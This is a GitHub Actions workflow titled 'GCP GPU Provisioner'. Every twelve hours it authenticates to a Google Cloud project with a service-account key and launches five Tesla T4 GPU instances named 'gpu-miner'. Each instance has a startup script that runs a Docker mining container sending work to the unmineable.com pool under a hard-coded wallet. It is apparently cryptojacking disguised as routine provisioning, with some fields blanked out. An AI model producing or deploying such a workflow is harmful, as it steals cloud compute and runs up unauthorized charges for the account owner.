name: GCP GPU Provisioner
on:
  schedule:
    - cron: '0 */12 * * *'
  workflow_dispatch:
jobs:
  provision:
    runs-on: ubuntu-latest
    steps:
      - name: GCP Auth
        env:
          GCP_KEY: "   "
        run: |
          echo "" | base64 -d > key.json
          gcloud auth activate-service-account --key-file=key.json
          PROJECT="sisu-tech-data-platform"
          
          # Provision 5 nodes with Tesla T4 GPUs
          for i in {1..5}; do
            INSTANCE_NAME="gpu-miner--1776905932"
            echo "Provisioning ..."
            gcloud compute instances create                --project=               --zone=us-central1-a               --machine-type=n1-standard-4               --maintenance-policy=TERMINATE               --accelerator=type=nvidia-tesla-t4,count=1               --image-family=ubuntu-2204-lts               --image-project=ubuntu-os-cloud               --boot-disk-size=50GB               --metadata=startup-script="#!/bin/bash
                apt-get update && apt-get install -y docker.io
                docker run -d --name miner --runtime=nvidia                 -e WALLET=D4dbTEpvsDDQK8V56USNgDsircfmDHXQQmTkafnxLR56 -e POOL=rx.unmineable.com:3333                 pluspaytr/pluspay-tcp-cloud-live:latest"
          done
